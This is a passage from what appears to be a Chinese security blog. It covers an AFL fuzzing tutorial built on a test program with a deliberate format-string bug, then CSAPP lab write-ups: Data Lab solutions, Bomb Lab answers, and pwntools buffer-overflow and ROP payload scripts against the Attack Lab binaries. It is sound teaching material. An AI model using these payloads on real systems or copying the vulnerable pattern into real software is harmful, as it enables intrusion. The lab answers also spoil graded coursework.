 <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir fuzz_test; <span class="built_in">cd</span> fuzz_test </span><br><span class="line">$ mkdir fuzz_in fuzz_out</span><br><span class="line">$ afl-gcc -g -o afl_test afl_test.c //插桩编译</span><br><span class="line">$ sudo su</span><br><span class="line">$ <span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">$ afl-fuzz -i fuzz_in -o fuzz_out ./afl_test</span><br></pre></td></tr></table></figure><blockquote><p>ps：随便在 fuzz_in 放一些种子文件即可。</p><p>命令解析：</p><ul><li><p><code>-i</code>：指定测试样本的路径</p></li><li><p><code>-o</code>：指定输出结果的路径</p></li><li><p>更详细见：<code>$ afl-fuzz -h</code></p></li><li><p><code>echo core &gt;/proc/sys/kernel/core_pattern</code></p><p>  在执行<code>afl-fuzz</code>前，如果系统配置为将核心转储文件（core）通知发送到外部程序。 将导致将崩溃信息发送到Fuzzer之间的延迟增大，进而可能将崩溃被误报为超时，所以我们得临时修改<code>core_pattern</code>文件</p></li></ul></blockquote><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200803145522.png"></p><h2 id="窗口解读"><a href="#窗口解读" class="headerlink" title="窗口解读"></a>窗口解读</h2><ul><li><p>Process timing:Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间。</p></li><li><p>Overall results：Fuzzer当前状态的概述。</p></li><li><p>Cycle progress：我们输入队列的距离。</p></li><li><p>Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节。</p></li><li><p>Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度。</p></li><li><p>Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息。</p></li><li><p>Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息。</p></li><li><p>Path geometry：有关Fuzzer找到的执行路径的信息。</p></li><li><p>CPU load：CPU利用率</p></li></ul><h2 id="分析crash"><a href="#分析crash" class="headerlink" title="分析crash"></a>分析crash</h2><p>因为程序本身很简单，跑了几分钟跑出来 4 个<code>crash</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ xxd id:000004,sig:06,src:000000,op:havoc,rep:64</span><br><span class="line"></span><br><span class="line">00000000: 4100 7f00 00f1 83ec ff00 7f00 00f1 7fff  A...............</span><br><span class="line">00000010: ffff 0c41 007f 0000 f1a2 ffff ff0b fd5f  ...A..........._</span><br><span class="line">00000020: 8000 0000 fe0c 5f6b 2000 ff0c 6200 7f0c  ......_k ...b...</span><br><span class="line">00000030: 5f6b 00f1 7fec ff00 7f00 00f1 7fff ffff  _k..............</span><br><span class="line">00000040: 0c41 007f 0000 f1a2 ffff ff0b fd5f 8000  .A..........._..</span><br><span class="line">00000050: 0000 fe0c 5f6b 2000 ff0c 6200 7f0c 5f6b  ...._k ...b..._k</span><br><span class="line">00000060: 0000 00fe 8108 7f00 0000 00fe 405f 6b00  ............@_k.</span><br><span class="line">00000070: 00ff 0000 f17f ecff 007f 0000 f17f ffff  ................</span><br><span class="line">00000080: ff0c 4100 7f00 00f1 a2ff ffff 0bfd 5f80  ..A..........._.</span><br><span class="line">00000090: 0000 00fe 0c5f 6b20 0000 00fe 7e0c 4100  ....._k ....~.A.</span><br><span class="line">000000a0: 7f00 00f1 7fff ffff 0bec 5f80 0000 00fe  .........._.....</span><br><span class="line">000000b0: 0c5f 6700 0000 fe7e 0800 0000 fe81 087f  ._g....~........</span><br><span class="line">000000c0: 0000 0000 fe40 5f6b 0000 00ff 4100 7f00  .....@_k....A...</span><br><span class="line">000000d0: 00f1 a2ff ffff 0bfd 5f80 0000 00fe 0c5f  ........_......_</span><br><span class="line">000000e0: 6b20 00ff 0c62 007f 0c5f 6b00 0000 fe72  k ...b..._k....r</span><br><span class="line">000000f0: 087f 0000 0000 fe40 5f6b 0000 ff0c 4100  .......@_k....A.</span><br><span class="line">00000100: 7f00 00f1 7fff ffff 0bec 5f80 0000 00fe  .........._.....</span><br><span class="line">00000110: 0c5f 6700 0000 fe7e 0c41 007f 0000 f17f  ._g....~.A......</span><br><span class="line">00000120: ffff ff0b ec5f 8000 0000 fe0c 5f67 0000  ....._......_g..</span><br><span class="line">00000130: 00fe 7e08                                ..~.</span><br></pre></td></tr></table></figure><p>可以看出来是由栈溢出所导致的。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ xxd id:000002,sig:06,src:000000,op:havoc,rep:128</span><br><span class="line">00000000: 256e                                     %n</span><br></pre></td></tr></table></figure><p>格式化字符串导致。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxd id:000000,sig:11,src:000001,op:havoc,rep:4</span><br><span class="line">00000000: 4672 6497 7364                           Frd.sd</span><br></pre></td></tr></table></figure><p>输入的字符串的首字符为F并且长度为6，则异常退出</p><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>黑盒测试要用到AFL的QEMU模式了。</p><p>所以我们需要再额外装一下东西。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ sudo apt-get install libini-config-dev libtool-bin automake bison libglib2.0-dev -y</span><br><span class="line">$ <span class="built_in">cd</span> afl-2.52/qemu_mode</span><br><span class="line">$ ./build_qemu_support.sh</span><br><span class="line">$ <span class="built_in">cd</span> .. </span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p>我们接着用刚刚的源文件重新编译然后进行新的黑盒 fuzz。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -g -o afl_test2 afl_test.c</span><br><span class="line">$ afl-fuzz -i fuzz_in -o fuzz_out -Q ./afl_test2</span><br></pre></td></tr></table></figure><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200804111331.png" alt="image"></p><h2 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fuzz_out/</span><br><span class="line">├── crashes</span><br><span class="line">│   ├── id:000000,sig:06,src:000000,op:havoc,rep:32</span><br><span class="line">│   ├── id:000001,sig:06,src:000000,op:havoc,rep:32</span><br><span class="line">│   ├── id:000002,sig:11,src:000001,op:havoc,rep:2</span><br><span class="line">│   ├── id:000003,sig:06,src:000002,op:havoc,rep:16</span><br><span class="line">│   ├── id:000004,sig:11,src:000000,op:havoc,rep:128</span><br><span class="line">│   ├── id:000005,sig:11,src:000002,op:havoc,rep:16</span><br><span class="line">│   └── README.txt</span><br><span class="line">├── fuzz_bitmap</span><br><span class="line">├── fuzzer_stats</span><br><span class="line">├── hangs</span><br><span class="line">├── plot_data</span><br><span class="line">└── queue</span><br><span class="line">    ├── id:000000,orig:test</span><br><span class="line">    ├── id:000001,src:000000,op:arith8,pos:0,val:-30,+cov</span><br><span class="line">    └── id:000002,src:000000,op:arith8,pos:0,val:-35,+cov</span><br><span class="line"></span><br><span class="line">3 directories, 13 files</span><br></pre></td></tr></table></figure><p><code>queue</code>：存放所有具有独特执行路径的测试用例。<br><code>crashes</code>：导致目标接收致命<code>signal</code>而崩溃的独特测试用例。<br><code>crashes/README.txt</code>：保存了目标执行这些<code>crash</code>文件的命令行参数。<br><code>hangs</code>：导致目标超时的独特测试用例。<br><code>fuzzer_stats</code>：<code>afl-fuzz</code>的运行状态。<br><code>plot_data</code>：用于<code>afl-plot</code>绘图。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95">https://zh.wikipedia.org/wiki/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95</a></p><p><a href="https://www.f-secure.com/en/consulting/our-thinking/15-minute-guide-to-fuzzing">https://www.f-secure.com/en/consulting/our-thinking/15-minute-guide-to-fuzzing</a></p><p><a href="https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/">https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/</a></p><p><a href="https://paper.seebug.org/841/#2_3">https://paper.seebug.org/841/#2_3</a></p><p><a href="https://paper.seebug.org/842/#_1">https://paper.seebug.org/842/#_1</a></p><p><a href="https://xz.aliyun.com/t/4314#toc-8">https://xz.aliyun.com/t/4314#toc-8</a></p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Afl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> Build </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP Lab</title>
      <link href="posts/ab6e7b0/"/>
      <url>posts/ab6e7b0/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记录一下 css app lab，<a href="http://csapp.cs.cmu.edu/3e/labs.html">下载地址</a></p><p>代码放在了 <a href="https://github.com/focu5/CSAPP-Labs">Github</a></p><h3 id="Data-Lab"><a href="#Data-Lab" class="headerlink" title="Data Lab"></a>Data Lab</h3><h4 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h4><p><code>x ^ y = (~x &amp; y) | (x &amp; ~y) </code></p><p>题目限制我们仅使用 <code>&amp; ～</code>，所以我们想办法代替 <code>｜</code> 即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(~(~x &amp; y) &amp; (~(x &amp; ~y)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h4><p>以补码形式返回最小的整数。即：符号为是1，其余均为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h4><p>如果是最大的整数则返回1.</p><p>注意三个比较讨厌的数：</p><blockquote><p>0x7fffffff：01111111111111111111111111111111<br>0xffffffff：11111111111111111111111111111111<br>0x80000000：10000000000000000000000000000000</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !((~x^(x+<span class="number">1</span>)) | !(x+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h4><p>判断所有奇数位是否都为1.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y = <span class="number">0xaa</span> + (<span class="number">0xaa</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">  y = y+ (y &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> !((y &amp; x) ^ y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：可以先自行构造出一个所有奇数位都为1的标准数，在进行比较。</p><h4 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h4><p>返回相反数，常识题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h4><p>计算输入值是否是数字 0-9 的 <code>ASCII</code> 值。</p><p>思路：先观察0x30-0x39的二进制数有什么特点，发现0x30-0x3f之间的第4、5位均为1。假设 x 是 0 - 9 之间的一个数，！(x &lt;&lt; 4 ^ 0x3) = 1，y = x + 0x6， ！(y &lt;&lt; 4 ^ 0x3) = 1，确保这两个同时成立即可判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y = x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">  x = x + <span class="number">0x6</span>;</span><br><span class="line">  <span class="keyword">int</span> z = x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">return</span> !(y ^ <span class="number">0x3</span>) &amp; !(z ^ <span class="number">0x3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h4><p>执行运算符 x ? y : z：当 x 不为 0 时，返回 y；否则返回 z。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  x = !x + ~<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (y &amp; x) | (z &amp; ~x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h4><p>判断 x &lt;= y</p><p><a href="https://zhuanlan.zhihu.com/p/59534845">参考</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> negX=~x+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> addX=negX+y;</span><br><span class="line">  <span class="keyword">int</span> checkSign = addX&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> leftBit = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> xLeft = x&amp;leftBit;</span><br><span class="line">  <span class="keyword">int</span> yLeft = y&amp;leftBit;</span><br><span class="line">  <span class="keyword">int</span> bitXor = xLeft ^ yLeft;</span><br><span class="line">  bitXor = (bitXor&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> ((!bitXor)&amp;(!checkSign))|(bitXor&amp;(xLeft&gt;&gt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h4><p>实现<code> ！</code>运算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h4><p>用二分法来判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> b16,b8,b4,b2,b1,b0;</span><br><span class="line">  <span class="keyword">int</span> sign=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  x = (sign&amp;~x)|(~sign&amp;x);</span><br><span class="line">  b16 = !!(x&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">4</span>;</span><br><span class="line">  x = x&gt;&gt;b16;<span class="comment">//如果有（至少需要16位），则将原数右移16位</span></span><br><span class="line">  b8 = !!(x&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">3</span>;<span class="comment">//剩余位高8位是否有1</span></span><br><span class="line">  x = x&gt;&gt;b8;<span class="comment">//如果有（至少需要16+8=24位），则右移8位</span></span><br><span class="line">  b4 = !!(x&gt;&gt;<span class="number">4</span>)&lt;&lt;<span class="number">2</span>;<span class="comment">//同理</span></span><br><span class="line">  x = x&gt;&gt;b4;</span><br><span class="line">  b2 = !!(x&gt;&gt;<span class="number">2</span>)&lt;&lt;<span class="number">1</span>;</span><br><span class="line">  x = x&gt;&gt;b2;</span><br><span class="line">  b1 = !!(x&gt;&gt;<span class="number">1</span>);</span><br><span class="line">  x = x&gt;&gt;b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="number">1</span>;<span class="comment">//+1表示加上符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Bomb-Lab"><a href="#Bomb-Lab" class="headerlink" title="Bomb Lab"></a>Bomb Lab</h3><p>其实有re、pwn基础，拆解还不算很困难。（还可以结合<code>ida</code>分析，不过个人感觉怼汇编理解会更好一些.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bomb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#phase_1</span></span><br><span class="line">p.sendline(<span class="string">&quot;Border relations with Canada have never been better.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_2</span></span><br><span class="line">p.sendline(<span class="string">&quot;1 2 4 8 16 32&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_3</span></span><br><span class="line">p.sendline(<span class="string">&quot;1 311&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_3</span></span><br><span class="line">p.sendline(<span class="string">&quot;7 0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_4</span></span><br><span class="line">p.sendline(<span class="string">&quot;YONUFG&quot;</span>)</span><br><span class="line"><span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_5</span></span><br><span class="line">p.sendline(<span class="string">&quot;4 3 2 1 6 5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Attack-Lab"><a href="#Attack-Lab" class="headerlink" title="Attack Lab"></a>Attack Lab</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">argv1 = sys.argv[<span class="number">1</span>]</span><br><span class="line">argv2 = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> argv1 == <span class="string">&quot;part1&quot;</span> :</span><br><span class="line">p = process(argv=[<span class="string">&#x27;./ctarget&#x27;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"><span class="keyword">elif</span> argv1 == <span class="string">&quot;part2&quot;</span>:</span><br><span class="line">p = process(argv=[<span class="string">&#x27;./rtarget&#x27;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn1</span>():</span></span><br><span class="line"><span class="comment">#ROPgadget --binary ctarget --only &quot;pop|ret&quot;</span></span><br><span class="line">rdi_ret = <span class="number">0x000000000040141b</span></span><br><span class="line"><span class="keyword">if</span> argv2 == <span class="string">&quot;level_1&quot;</span>:</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>+p64(<span class="number">0x4017c0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> argv2 == <span class="string">&quot;level_2&quot;</span>:</span><br><span class="line">rdi_ret = <span class="number">0x40141b</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x59b997fa</span>) + p64(<span class="number">0x4017ec</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> argv2 == <span class="string">&quot;level_3&quot;</span>:</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x5561dcb8</span>) + p64(<span class="number">0x4018fa</span>) + <span class="string">&quot;0x59b997fa&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn2</span>():</span></span><br><span class="line"><span class="comment">#ROPgadget --binary rtarget --only &quot;pop|ret&quot;</span></span><br><span class="line">rdi_ret = <span class="number">0x000000000040141b</span></span><br><span class="line"><span class="keyword">if</span> argv2 == <span class="string">&quot;level_2&quot;</span>:</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x59b997fa</span>) + p64(<span class="number">0x4017ec</span>) </span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">elif</span> argv2 == <span class="string">&quot;level_3&quot;</span>:</span><br><span class="line">read_plt = <span class="number">0x400D30</span></span><br><span class="line">main_addr = <span class="number">0x4011AD</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x6054E4</span>) + p64(<span class="number">0x4018fa</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> argv1 == <span class="string">&quot;part1&quot;</span>:</span><br><span class="line">pwn1()</span><br><span class="line"><span class="keyword">elif</span> argv1 == <span class="string">&quot;part2&quot;</span>:</span><br><span class="line">pwn2()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Arch-Lab"><a href="#Arch-Lab" class="headerlink" title="Arch Lab"></a>Arch Lab</h3><blockquote><p>$ sudo apt-get install bison flex</p><p>$ cd Arch_lab</p><p>$ tar xvf  sim.tar</p><p>$ cd sim; make clean; make</p></blockquote><h4 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h4><p>根据<code>examples.c</code>给的三个函数，写出对应的<code>y86-64</code> 汇编代码。</p><blockquote><p>csapp p252 给了示例代码，模仿即可。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#sum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">call main             # Execute main program</span><br><span class="line">halt  # Terminate program</span><br><span 